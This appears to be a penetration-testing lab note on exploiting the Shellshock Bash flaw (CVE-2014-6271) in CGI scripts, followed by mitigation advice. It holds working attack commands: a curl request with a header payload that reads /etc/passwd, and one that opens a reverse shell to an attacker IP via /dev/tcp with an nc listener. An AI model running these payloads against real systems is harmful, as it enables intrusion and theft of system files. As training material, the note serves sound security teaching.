CGI scripts and programs are kept in the `/CGI-bin` directory on a web server and can be written in C, C++, Java, PERL, etc.

# Types of Attacks
[CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)
The Shellshock vulnerability allows an attacker to exploit old versions of Bash that save environment variables incorrectly.
`env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"`

### GoBuster
```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi

curl -i http://10.129.204.231/cgi-bin/access.cgi

curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :'' http://10.129.204.231/cgi-bin/access.cgi
```

# Exploitation
```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi

sudo nc -lvnp 7777
```

# Mitigation
At the bottom of this lesson.
This [blog post](https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability) contains useful tips for mitigating the Shellshock vulnerability. The quickest way to remediate the vulnerability is to update the version of Bash on the affected system. This can be trickier on end-of-life Ubuntu/Debian systems, so a sysadmin may have first to upgrade the package manager. With certain systems (i.e., IoT devices that use CGI), upgrading may not be possible. In these cases, it would be best first to ensure the system is not exposed to the internet and then evaluate if the host can be decommissioned. If it is a critical host and the organization chooses to accept the risk, a temporary workaround could be firewalling off the host on the internal network as best as possible. Keep in mind that this is just putting a bandaid on a large wound, and the best course of action would be upgrading or taking the host offline.